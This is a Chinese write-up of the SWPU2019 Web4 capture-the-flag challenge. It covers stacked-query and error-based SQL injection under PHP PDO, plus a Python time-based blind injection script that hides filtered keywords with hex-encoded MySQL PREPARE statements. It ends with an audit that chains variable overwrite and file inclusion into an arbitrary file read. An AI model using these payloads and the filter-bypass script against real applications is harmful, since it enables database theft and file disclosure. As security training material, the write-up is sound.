# \[SWPU2019]Web4

## \[SWPU2019]Web4

## 考点

* PDO场景下的SQL注入
* SQL盲注
* 代码审计

## wp

### PDO多语句执行

PHP数据对象（PDO）扩展为PHP访问数据库定义了一个轻量级的一致接口\
PHP连接MySQL数据库的方式：MySQL、Mysqli、PDO

![](https://i.loli.net/2020/08/04/eAfhniY5GupF1U8.png)

可以看到Mysqli和PDO是都是支持多语句执行的

Mysqli通过multi\_query()函数来进行多语句执行，普通的mysqli\_query()函数只执行单个语句

```php
<?php
$host='127.0.0.1:3306';
$dbName='user';
$user='root';
$pass='root';
$mysqli = mysqli_connect($host,$user,$pass,$dbName);
if(mysqli_connect_errno())
{
   echo mysqli_connect_error();
}
$sql = "select * from users where id=1;";
$sql .= "delete from users where id=2;";
$mysqli->multi_query($sql);
$data = $mysqli->store_result();
print_r($data->fetch_row());

mysqli_close($mysqli);
```

![](https://i.loli.net/2020/08/04/t1IngpLY7BziRZG.png)

![](https://i.loli.net/2020/08/04/ZVTfzFHWC1mPXbv.png)

PDO中通过query()函数同数据库交互

```php
<?php
$dbms='mysql';
$host='127.0.0.1:3306';
$dbName='user';
$user='root';
$pass='root';
$dsn="$dbms:host=$host;dbname=$dbName";
try {
     $pdo = new PDO($dsn, $user, $pass);
} catch (PDOException $e) {
     echo $e;
}
$sql = "select * from users where id=1;";
$sql .= "delete from users where id=3;";
$stmt = $pdo->query($sql);
while($row=$stmt->fetch(PDO::FETCH_ASSOC))
{
    var_dump($row);
    echo "<br>";
}
```

![](https://i.loli.net/2020/08/04/9UaApPzgNWMTDcx.png)

PDO默认支持多语句查询，如果<mark style="background-color:orange;">php版本小于5.5.21</mark>或者<mark style="background-color:orange;">创建PDO实例时未设置PDO::MYSQL\_ATTR\_MULTI\_STATEMENTS为false</mark>时可能会造成堆叠注入

如果想禁止多语句执行，可在创建PDO实例时将PDO::MYSQL\_ATTR\_MULTI\_STATEMENTS设置为false\
`new PDO($dsn, $user, $pass, array( PDO::MYSQL_ATTR_MULTI_STATEMENTS => false))`

### MySQL预处理

MySQL官方将prepare、execute、deallocate统称为PREPARE STATEMENT

预制语句的SQL语法基于三个SQL语句：

```
prepare stmt_name from preparable_stmt;
execute stmt_name [using @var_name [, @var_name] ...];
{deallocate | drop} prepare stmt_name;
```

### PDO预处理

PDO预编译执行过程分三步：\
prepare(SQL) 编译SQL语句 bindValue(param, $value) 将value绑定到param的位置上\
execute() 执行

PDO分为模拟预处理和非模拟预处理。\
模拟预处理是防止某些数据库不支持预处理而设置的，在初始化PDO驱动时，可以设置一项参数，PDO::ATTR\_EMULATE\_PREPARES，作用是打开模拟预处理(true)或者关闭(false),默认为true。PDO内部会模拟参数绑定的过程，SQL语句是在最后execute()的时候才发送给数据库执行。

非模拟预处理则是通过数据库服务器来进行预处理动作，主要分为两步：第一步是prepare阶段，发送SQL语句模板到数据库服务器；第二步通过execute()函数发送占位符参数给数据库服务器进行执行。

如果说开启了模拟预处理，那么PDO内部会模拟参数绑定的过程，SQL语句是在最后execute()的时候才发送给数据库执行；如果我这里设置了PDO::ATTR\_EMULATE\_PREPARES => false，那么PDO不会模拟预处理，参数化绑定的整个过程都是和Mysql交互进行的。

模拟预处理

```php
<?php
$dbms='mysql';
$host='127.0.0.1:3306';
$dbName='user';
$user='root';
$pass='root';
$dsn="$dbms:host=$host;dbname=$dbName";
try {
     $pdo = new PDO($dsn, $user, $pass, array( PDO::MYSQL_ATTR_MULTI_STATEMENTS => false));
} catch (PDOException $e) {
     echo $e;
}
$username = '1';
$sql = "select * from users where id = ?";
$stmt = $pdo->prepare($sql);
$stmt->bindParam(1,$username);
$stmt->execute();
while($row=$stmt->fetch(PDO::FETCH_ASSOC))
{
     var_dump($row);
     echo "<br>";
}
```

非模拟预处理代码

```php
<?php
$dbms='mysql';
$host='127.0.0.1:3306';
$dbName='user';
$user='root';
$pass='root';
$dsn="$dbms:host=$host;dbname=$dbName";
try {
     $pdo = new PDO($dsn, $user, $pass, array( PDO::MYSQL_ATTR_MULTI_STATEMENTS => false));
} catch (PDOException $e) {
     echo $e;
}
$pdo->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
$username = '1';
$sql = "select * from users where id = ?";
$stmt = $pdo->prepare($sql);
$stmt->bindParam(1,$username);
$stmt->execute();
while($row=$stmt->fetch(PDO::FETCH_ASSOC))
{
     var_dump($row);
     echo "<br>";
}
```

两段代码的区别在于，非模拟预处理代码在 `$username = '1';` 前多了一行 `$pdo->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);`

### 预处理下的安全问题

模拟预处理下

```php
<?php
$dbms='mysql';
$host='127.0.0.1:3306';
$dbName='user';
$user='root';
$pass='root';
$dsn="$dbms:host=$host;dbname=$dbName";
try {
    $pdo = new PDO($dsn, $user, $pass);
} catch (PDOException $e) {
    echo $e;
}
$id = $_GET['id'];
$sql = "select id,".$_GET['field']." from user where id = ?";
$stmt = $pdo->prepare($sql);
$stmt->bindParam(1,$id);
$stmt->execute();
while($row=$stmt->fetch(PDO::FETCH_ASSOC))
{
    var_dump($row);
    echo "<br>";
}
```

正常请求 http://127.0.0.1/pdo/5.php?id=1\&field=username\
结果如下：\
array(2) { \["id"]=> string(1) "1" \["username"]=> string(5) "admin" }

但是field参数可控，可以执行多条语句\
http://127.0.0.1/pdo/5.php?id=1\&field=username from users;select username,password\
结果如下：\
array(2) { \["id"]=> string(1) "1" \["username"]=> string(5) "admin" }\
array(2) { \["id"]=> string(1) "4" \["username"]=> string(5) "test4" }

当设置`$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);`时，也可以达到报错注入效果\
`http://127.0.0.1/pdo/5.php?id=1&field=username from users where (1 and extractvalue(1,concat(0x7e,(select(database())),0x7e)));%23`\
结果：\
`Fatal error: Uncaught PDOException: SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~user~' in......line 20`

非模拟预处理时，同样的field字段可控，这时多语句不可执行，但是当设置`$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);`时，也可进行报错注入\
`http://127.0.0.1/pdo/5.php?id=1&field=username from users where (1 and extractvalue(1,concat(0x7e,(select(version())),0x7e)));%23`\
结果：\
`Fatal error: Uncaught PDOException: SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~5.7.26~' in......line 20`

### wp

正常请求\


![](https://i.loli.net/2020/08/04/3IAEmOK29kHBgl6.png)

在username处加上单引号就会报错，但是加上 `';` 就返回正常\


![](https://i.loli.net/2020/08/04/r7JkxKuEoYhmsSi.png)

由于过滤了`select,if,sleep,substr`等大多数注入常见的单词，但是注入又不得不使用其中的某些单词。那么在这里我们就可以用`16进制+mysql预处理`来绕过。

![](https://i.loli.net/2020/08/04/Za8BsKbEFUNeHRc.png)

脚本跑不出来

```python
import requests
import json
import time

def main():

    url = 'http://b4dda812-2027-44c6-a044-e15bb77bf6d4.node3.buuoj.cn/index.php?r=Login/Index'

    payloads = "tesft';SET @a=0x{0};PREPARE smtm_test FROM @a;EXECUTE smtm_test;DEALLOCATE PREPARE smtm_test;"
    flag = ''
    for i in range(1,30):
        # SELECT IF(ASCII(SUBSTR((SELECT flag FROM flag),1,1))=103,SLEEP(3),1)
        
        payload = "SELECT IF(ASCII(SUBSTR((SELECT flag FROM flag),{0},1))={1},SLEEP(3),1)"
        print(i)
        for j in range(102,104):

            datas = {'username':payloads.format(str_to_hex(payload.format(i,j))),'password':'test'}
            # print(datas)
            data = json.dumps(datas)
            headers = {"Content-Type":"application/json"}
            
            try:
                res = requests.post(url=url, data=data, headers=headers, timeout=3)
                print(res.text)
            except requests.exceptions.ReadTimeout:
                flag = flag + chr(j)
                print(flag)
                break


def str_to_hex(s):
    return ''.join([hex(ord(c)).replace('0x', '') for c in s])

if __name__ == '__main__':
    main()
```

结果是`glzjin_wants_a_girl_friend.zip`

下载，然后进行代码审计，典型的MVC框架，先看一下核心配置，找到路由控制

```php
	$r = explode('/', $_REQUEST['r']);
	list($controller,$action) = $r;
	$controller = "{$controller}Controller";
	$action = "action{$action}";
    $data = call_user_func(array( (new $controller), $action));
```

假设GET的输入为?r=Login/Index，这段代码就去请求LoginController中的actionIndex方法

然后看一下控制器文件，总共三个。在BaseController.php中发现extract函数，可能存在变量覆盖，接着找可控点，在UserController.php发现其actionIndex函数是完全可控的，其调用的视图为userIndex.php，然后在userIndex.php发现存在文件包含，结合上面的变量覆盖就可以实现任意文件读取

![](../../.gitbook/assets/HjBsySntu8fbokR.png)

![](../../.gitbook/assets/S5vW9CXuA7FrbOg.png)

![](../../.gitbook/assets/Fx5Nca4QYLbng3T.png)

favicon.ico和flag.php在同一个路径下，把favicon.ico改成flag.php即可\
最终payload\
?r=User/Index\&img\_file=/../flag.php

## 小结

1. SQL注入要注意可以执行多条语句的情况，使用16进制+mysql预处理
